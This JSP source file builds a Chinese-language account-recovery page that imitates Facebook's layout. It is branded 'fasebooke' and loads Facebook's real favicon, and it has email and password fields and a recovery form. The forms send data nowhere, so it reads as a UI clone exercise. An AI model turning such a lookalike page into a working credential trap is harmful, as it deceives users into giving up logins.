<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link href="<%=request.getContextPath()%>/resources/css/bootstrap.css" rel="stylesheet">
    <link href="<%=request.getContextPath()%>/resources/css/normalize.css" rel="stylesheet">
    <link href="<%=request.getContextPath()%>/resources/css/main.css" rel="stylesheet">
 <link rel="shortcut icon" href="https://www.facebook.com/rsrc.php/yl/r/H3nktOa7ZMg.ico">
    <link href="http://cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css" rel="stylesheet">
</head>
<body>
<body>
<div class="fb-container">
  <div class="fb_headcontainer">
   <div class="fb_loghead">
     <div class="fb_left">
     <h1>
      <a href="<%=request.getContextPath()%>/index.jsp"> 
          <i>
          <u>
           fasebooke
              </u>
          </i>
          </a>
     </h1>
       </div>
       <div class="fb_logright">
       <div class="fb_logmain">
         <form>
          <table>
             <tbody>
              <tr>
                  <td><label for="email" style="color:white">邮箱/手机</label></td>
                  <td><label for="password" style="color:white">密码</label></td>
              </tr>
              <tr>
                  <td>
                    <input type="text" id="email">  
                  </td>
                  <td>
                      <input type="password" style="margin-left:10px" id="password">
                  </td>
                  <td >
                      <button type="submit" class="btn-default btn-info" style="margin-left:10px">登录</button>
                  </td>
              </tr>
              <tr>
                  <td>
                      
                  </td>
                  <td>
                      <a href="<%=request.getContextPath()%>/jsp/login.jsp" style="color:#9cb4d8">忘记密码？</a>
                  </td>
                
              </tr>
              </tbody>
          </table> 
          </form>
       </div>
       </div>
   </div>  
   </div>
   <div style="background-color:#e9ebee;padding:80px 0">
      <div style="width:100%">
          <form>
              <div class="whiteboxs">
                  <div style=" border-bottom: 1px solid #aaa;padding-left:20px;">
                      <h2 style="color:#162643;
    font-size: 23px">找回账户</h2>
                  </div>
                  <div style="padding-left:20px;padding-right:20px;padding-top:20px; border-bottom: 1px solid #ccc;">
                      <div class="_identyfy" >
                          <table>
                              <tbody>
                                  <tr>
                                      <td></td>
                                      <td>邮箱、手机号、帐号或全名</td>
                                  </tr>
                                  <tr>
                                      <td>
                                <span class="fa  fa-envelope-square" style="font-size:40px; color:blue;padding-right:4px"></span>
                                      </td>
                                      <td>
                                         <input type="text" class="form-control" style="width:255px"> 
                                      </td>
                                  </tr>
                              </tbody>
                          </table>
                      </div>
                  </div>
                  <div style="line-height: 16px;
    padding: 8px 10px;background-color:#e9ebee;padding-bottom:15px">
                   <div style="zoom:1">
                    <div style="float:right">
                          <button type="submit" class="btn btn-default btn-info">搜索</button>
                            <button type="button" class="btn btn-default">取消</button>
                      </div>
                     <div style="padding-top:10px">
                      <a href="">无法识别我的账户</a>    
                     </div>
                     </div>
                      
                  </div>
              </div>
          </form>
      </div>
       
   </div>
    </div>

</body>
</html>